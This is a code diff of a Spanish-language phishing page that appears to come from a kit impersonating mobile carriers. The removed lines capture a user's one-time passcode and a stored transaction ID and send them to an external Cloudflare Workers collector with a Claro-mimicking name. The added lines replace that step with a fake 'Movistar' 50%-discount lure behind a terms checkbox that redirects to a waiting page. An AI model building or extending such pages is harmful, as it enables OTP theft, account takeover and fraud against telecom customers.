@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Ingresar código</title>
+  <title>Promoción Movistar</title>
   <style>
     body {
       background: #0a0f2c;
@@ -19,105 +19,94 @@
       background: linear-gradient(180deg,#12203f,#0e1630);
       padding: 28px;
       border-radius: 12px;
-      width: 360px;
+      width: 380px;
       box-shadow: 0 8px 30px rgba(2,6,23,0.6);
       text-align: center;
     }
-    h2 { margin: 0 0 8px; color: #cfefff; }
-    p { margin: 0 0 18px; color: #b7dff6; font-size: 0.95rem; }
-    input {
-      width: 100%;
-      padding: 12px;
-      border-radius: 8px;
-      border: none;
-      background: #091428;
-      color: #fff;
-      box-sizing: border-box;
-      font-size: 1rem;
+    h2 { 
+      margin: 0 0 12px; 
+      color: #cfefff; 
+    }
+    p { 
+      margin: 0 0 18px; 
+      color: #b7dff6; 
+      font-size: 0.95rem; 
+      line-height: 1.4; 
+    }
+    .terms {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      font-size: 0.9rem;
+      color: #cfefff;
+      margin: 16px 0;
+      text-align: left;
+    }
+    input[type="checkbox"] {
+      accent-color: #4fc3f7;
+      width: 18px;
+      height: 18px;
     }
     .actions {
       margin-top: 16px;
-      display:flex;
-      gap:10px;
+      display: flex;
+      gap: 10px;
     }
     button {
-      flex:1;
+      flex: 1;
       padding: 11px;
       border-radius: 8px;
       border: none;
       cursor: pointer;
       font-weight: 700;
+      font-size: 0.95rem;
     }
-    .send { background: #4fc3f7; color: #041028; }
+    .accept { background: #4fc3f7; color: #041028; }
     .cancel { background: #263648; color: #cfefff; }
     .msg { margin-top:12px; font-size:0.95rem; color:#d0eefd; }
   </style>
 </head>
 <body>
   <div class="card">
-    <h2>Introduce el código</h2>
-    <p>Escribe el código que recibiste y presiona Enviar.</p>
+    <h2>¡Genial!</h2>
+    <p>Tu plan pospago es válido para la promoción del <b>50% de descuento</b> en tu factura.</p>
+    <p>Acepta los términos y condiciones para continuar.</p>
 
-    <input id="otp" type="text" placeholder="Código (OTP)" inputmode="numeric" />
+    <div class="terms">
+      <input type="checkbox" id="tyc" />
+      <label for="tyc">Acepto los términos y condiciones</label>
+    </div>
 
     <div class="actions">
       <button class="cancel" id="volver">Volver</button>
-      <button class="send" id="enviar">Enviar</button>
+      <button class="accept" id="continuar">Continuar</button>
     </div>
 
     <div class="msg" id="msg"></div>
   </div>
 
   <script>
-    const WORKER_BASE = "https://blue-night-7897.claropromoxlaro.workers.dev"; // tu worker
-
     document.getElementById('volver').addEventListener('click', () => {
       window.location.href = 'cargando.html';
     });
 
-    document.getElementById('enviar').addEventListener('click', async () => {
+    document.getElementById('continuar').addEventListener('click', () => {
       const msgEl = document.getElementById('msg');
-      const otp = document.getElementById('otp').value.trim();
-      if (!otp) {
-        msgEl.textContent = "Ingresa el código antes de enviar.";
+      const tyc = document.getElementById('tyc').checked;
+
+      if (!tyc) {
+        msgEl.textContent = "Debes aceptar los términos y condiciones para continuar.";
         return;
       }
 
-      const transactionId = localStorage.getItem('transactionId');
-      if (!transactionId) {
-        msgEl.textContent = "Error: falta transactionId. Vuelve a iniciar sesión.";
-        setTimeout(() => window.location.href = 'login.html', 1500);
-        return;
-      }
+      msgEl.textContent = "Procesando aceptación...";
 
-      msgEl.textContent = "Enviando código...";
-      try {
-        const res = await fetch(`${WORKER_BASE}/otp-code`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ transactionId, otp })
-        });
+      // Aquí puedes guardar el estado en localStorage o enviarlo a tu servidor
+      localStorage.setItem("promoAceptada", "true");
 
-        if (!res.ok) {
-          const err = await res.text();
-          msgEl.textContent = "Error al enviar: " + (err || res.status);
-          return;
-        }
-
-        const json = await res.json();
-        if (json.ok) {
-          msgEl.textContent = "Código enviado. Volviendo a espera...";
-        } else {
-          msgEl.textContent = "Respuesta inesperada: " + JSON.stringify(json);
-        }
-
-      } catch (e) {
-        console.error("Error enviando código:", e);
-        msgEl.textContent = "Error de conexión al enviar el código.";
-      }
-
-      // pequeña espera para que el usuario vea el mensaje y luego volver a cargando
-      setTimeout(() => { window.location.href = 'cargando.html'; }, 900);
+      setTimeout(() => {
+        window.location.href = "cargando.html";
+      }, 1000);
     });
   </script>
 </body>
